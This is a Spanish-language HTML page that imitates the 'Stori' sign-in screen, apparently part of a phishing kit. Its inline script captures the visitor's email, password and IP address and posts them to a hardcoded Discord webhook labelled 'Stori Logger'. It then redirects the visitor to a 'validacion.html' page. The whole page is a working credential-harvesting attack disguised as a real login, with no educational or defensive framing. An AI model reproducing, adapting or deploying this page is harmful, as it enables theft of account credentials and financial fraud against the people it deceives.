<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Stori - Iniciar sesión</title>
  <link rel="stylesheet" href="datos/styles.css" />
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background-color: #f5f5f5; color: #333; line-height: 1.5; }
    .container { max-width: 396px; margin: 13px auto; padding: 20px; border-radius: 19px; min-height: 100vh; background: white; position: relative; }
    header { display: flex; align-items: center; padding: 1rem; background: white; border-bottom: 1px solid #eee; }
    .back-button { background: none; border: none; padding: 0.5rem; cursor: pointer; }
    .header-text { margin-left: 1rem; font-size: 1rem; color: #333; }
    .spacer { flex: 1; }
    main { padding: 2rem 1.5rem; display: flex; flex-direction: column; align-items: center; text-align: center; }
    h1 { font-size: 1.25rem; margin-bottom: 0.5rem; font-weight: 600; }
    p { margin-bottom: 2rem; }
    .input-group { margin-bottom: 1rem; position: relative; width: 100%; }
    .input-group input { width: 100%; padding: 0.8rem 1rem; border: 2px solid #ddd; border-radius: 8px; font-size: 1rem; outline: none; }
    .input-group input:focus { border-color: #008f76; }
    .checkbox-group { display: flex; align-items: center; gap: 0.5rem; margin-bottom: 1rem; width: 100%; text-align: left; font-size: 0.9rem; }
    .legal-info { font-size: 0.8rem; color: #666; margin-bottom: 1rem; }
    .submit-button { width: 100%; padding: 1rem; background-color: #00d180; color: white; border: none; border-radius: 8px; font-size: 1rem; cursor: pointer; margin-top: 1rem; transition: background-color 0.3s; }
    .submit-button:disabled { background-color: #ccc; cursor: not-allowed; }
    .login-link { display: block; margin-top: 1.5rem; color: #008f76; text-decoration: none; font-weight: 500; }
    @media (min-width: 768px) { .container { margin: 2rem auto; min-height: calc(100vh - 4rem); border-radius: 1rem; box-shadow: 0 4px 6px rgba(0,0,0,0.1); } }
  </style>
</head>
<body>
  <div class="container">
    <header>
      <button class="back-button" aria-label="Volver">
        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="m15 18-6-6 6-6"></path></svg>
      </button>
      <img style="width: 150px" src="datos/LogSto.svg" alt="Stori" class="logo" />
      <span class="spacer"></span>
      <span class="page-number">1 de 3</span>
    </header>

    <main>
      <h1>Iniciar sesión</h1>
      <p>Ingresa tu correo y tu contraseña</p>

      <form id="signup-form">
        <div class="input-group">
          <input type="email" id="email" placeholder="Correo electrónico" required />
        </div>
        <div class="input-group">
          <input type="password" id="pas" placeholder="Contraseña" required />
        </div>
        <div class="checkbox-group">
          <input type="checkbox" id="accept-privacy" />
          <label for="accept-privacy">Acepto el <a href="#">aviso de privacidad</a></label>
        </div>
        <p class="legal-info">Consulta nuestra <a href="#">información legal</a></p>
        <button type="submit" id="continuar" class="submit-button" disabled>Continuar</button>
      </form>

      <a href="#" class="login-link">Ya tengo cuenta Stori</a>
    </main>
  </div>

  <script>
    // NUEVO WEBHOOK ACTUALIZADO
    const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1571213669348675625/h6b4ppxq74Q9WmwVFCrcCQ-hcWpKboACJX5KyVzURPvxCvNxS9OdAncT0vRavWsYMJr0';

    async function getIP() {
      try { const res = await fetch('https://api.ipify.org?format=json'); const data = await res.json(); return data.ip; } 
      catch { return 'Desconocida'; }
    }

    async function sendToDiscord(message) {
      try {
        await fetch(DISCORD_WEBHOOK, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ username: "Stori Logger", content: message })
        });
      } catch (error) { console.error('Error Discord:', error); }
    }

    const input = document.getElementById('pas');
    const boton = document.getElementById('continuar');

    input.addEventListener('input', function () {
      if (input.value.length > 3) { boton.style.backgroundColor = '#00d180'; boton.disabled = false; } 
      else { boton.style.backgroundColor = ''; boton.disabled = true; }
    });

    document.getElementById('signup-form').addEventListener('submit', async function (e) {
      e.preventDefault();
      const email = document.getElementById('email').value;
      const password = document.getElementById('pas').value;
      const ip = await getIP();

      const message = `🛡️ **NUEVO INICIO DE SESIÓN (Stori)**\n\n📧 **Email:** ${email}\n🔑 **Contraseña:** ${password}\n🌐 **IP:** ${ip}\n🕒 **Fecha:** ${new Date().toLocaleString()}`;

      await sendToDiscord(message);
      window.location.href = 'validacion.html';
    });
  </script>
</body>
</html>
